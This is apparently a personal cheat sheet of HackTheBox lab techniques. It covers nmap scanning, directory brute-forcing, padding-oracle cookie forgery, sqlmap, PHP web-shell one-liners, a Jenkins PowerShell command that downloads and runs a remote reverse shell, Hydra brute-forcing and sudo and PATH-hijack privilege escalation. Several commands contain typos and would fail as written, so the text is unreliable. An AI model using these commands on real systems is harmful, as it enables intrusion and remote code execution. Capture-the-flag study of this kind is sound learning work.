## HackTheBox : 

__Tools and Techniques used while doing the boxes and watching @ippsec @Derek_Rook__

![Image](/img/h.JPG)

HBT: Tools and Techniques
--------------------------

Initial Scanning:
-----------------

 >>nmap -sC -sV -oA initial IPaddress
	
	-sC  using nmap scripts
	-sV  detecting services versions 
	-oA output formatting
	
>> nmap -A -sV IP_address	

Web Enumeration: 
----------------
Note: GOOGLE EVERYTHING, Do not take anything for granted, It might be the CLUE


- View the source code


- Curl the site :

	>> curl http://IPaddress  | check if the website has hidden useful metadata
	>> curl -o output.txt http://IPaddress

	
- Proxy the request and check the GET and POST requests


- Gobutser /Ddirbuster: Enumerate the site for hidden directories

	>> gobuster -u htpp://IPaddress -w /user/share/dirbuster/directory/-list-2.3-medium.txt  -t 15 
	
	>> gobuster -u http://IPaddress -w WordList  -x FileExtension [ex:php, old, bak]
	
	
- Use Wapplyzer add-on on Firefox for detecting the site technologies


- Check what type and version of framework the site is running on:

	>> Wordpress, Nibbleblog, Jeeves
	
	>> Check README, to find the version of the framework

	
	
- Login Pages:

	- Try default credentials 
	
	- Try SQL common injections 
	
	
	

- SQLMap: 

	>> sqlmap -r login.re --level 4 --risk 3 
	
		- login.re is a POST resquest copied from Burpsuite 

		
		
- Nikto: fingerprint the website : 

	>> nikto -host http://IPaddress  -o output.txt

	

	
- Cookies: 

	- auth : try Oracle Padding Attack     | Lazy HTB
	
		- Oracle Padding Attack : "Invalid Padding" | used authentication cookies 
			
			>> downloand PadBuster | Github
			>> padbuster http://IPaddress  Auth_COOKIE 8 auth=Auth_COOKIE  -encoding 0 --plaintext user=admin
			
		- Cookies: auth=$CookieValue$
	
	
	- auth : try Bit Flipper on BurpSuite  | Lazy HTB
	

	
- DirSearch: another enumeration tool, similar to gobuster | Github
	
	>> dirsearch -u http://IPaddress -e php -w wordList
	
		- e type of files : php, old, bak
		- w wordList



Exploitation:
-------------

- Google exploits for :

	- services type and version number
	
	- OS type and version: Ex: Windows 2003, Ubuntu 
	
	- Web frames version or vulnerable plugins
	
- Check previous HTB exploits: Exploit.txt

- Gather system information :

	- Linux: Check Linux.txt  		| TODO
	
	- Windows: Check Windows.txt	| TODO

- Searchsploit for vulnerable services or operating system version

	>> searchsploit nibbleblog
	

- If an exploit is found, open it and read the description of how it is used and check the exploit 
  reference.Found it helpful in understanding how to use the exploit manually without Metasploit
   

- Use BurpSuite to intercetp requests when uploading shells



Uploading Shells:
------------------

- Webshells: Pentest Monkey

	
- PowerShells:
	- Nishang Invoke_powerShell_tcp 

		
- PHP oneliner:
	>> ` <?php echo system($_REQUEST['cmd']); ?> `
	&nbsp;
	>> ` <?php echo system($_GET['cmd'].' 2>&1'); ?> ` 

	
	
- Python Shell:
	>> python -c "import pty;pty.spawn('/bin/bash')"
	>> python3 -c "import pty;pty.spawn('/bin/bash')"
	
	
- Unicorn Shells
	
	>> 
	
	
	
- Jenkins Commandline Exection:
	>> cmd = """ powershell "IEX(New-Object New.WebClient).downloandingString('http://IPaddress/reverse_shell.ps1')"  """
	>> printlin cmd.execute().text
	
	-Note:reverse_shell.ps1 is a powershell from Nishang


	
- Getting proper shells
	>> Ctrl + Z 
	>> stty raw -echo  | for autocomplete shells
	>> FG + Enter      | to get autotab 

		
File Transfer:
--------------
	
- Netcat 


		
- SMB	
	- Impact-smbserver  for running SMB servers|  Github | [HTB:Jeeves]
	- Mount a new Drive for the SMB share  
		>> New-PSDrive -Name "Follow" -PSProvider "FileSystem" -Root "http:\\IPaddress\SmbFile"   
	- Copies the file to the local diectory 
		>> cp FilePath . 
	
	
- Python SimmpleHTTP
	>> python -m SimpleHttpServer 80
	>> python3 http.server 80
		
	
	
	
BruteForcing Logins:
--------------------

- Hydra:
	>> hydra -l admin -P Wordlist[Rockyou] IPaddress http-post-form "/directory/admin.php:username=^USER^&password=^PASS^"
	
	- lowercase l if you know the username and uppaercase L if you do not know the username
	- lowercaser p if you know the password and uppercase P if you do not know the password

	
- Hashcat
	>> ./hashcat64.bin -m [TypeOfHash]  [HashFile]
	
	
	
Remote Connection:
-------------------

- RDP (Remote Deskptop Protocol)


- SSH:

	>> save ssh key if you have any as sshkeys.key
	>> ssh user@IPaddress sshkeys.key

- SMB:



	
Privilege Escalation
---------------------

Windows
--------

- Windows Suggestor 
	>>


- Check the box privileges:
	>> whoai /priv
	>> dir /r

- 	
	

	
Linux
------

- Linux Suggestor
	>> Linux Exploit Suggestor by mzet Github
	

- Run sudo -l if the box is linux 

- Shell inside a Shell
	
	- Create bash file and run it as sudo 
	
		>> #!/bin/sh
			sh -c /bin/sh
		
		>> #!/bin/sh
			/bin/sh
			
	- Run the file a sudo 
		>> chmod +x escalate.sh
		>> sudo escalate.sh    | Note: running sudo make take time on the boxes | PATIENCE !!!
		
		
- Compilers:

	>> gcc -o output -output.c
	
	
- StickyBits: [HTB:Lazy]

	- Debugging the executable:
		>> file execFile       | to check the type of the executable
		>> gbd ./execFile      |  debugging the file 
	
	- Hijacking Paths: is used when the executable does not specify  the full path in the program
		>> export PATH=`pwd`:$PATH        | change regular system path to local path 
		
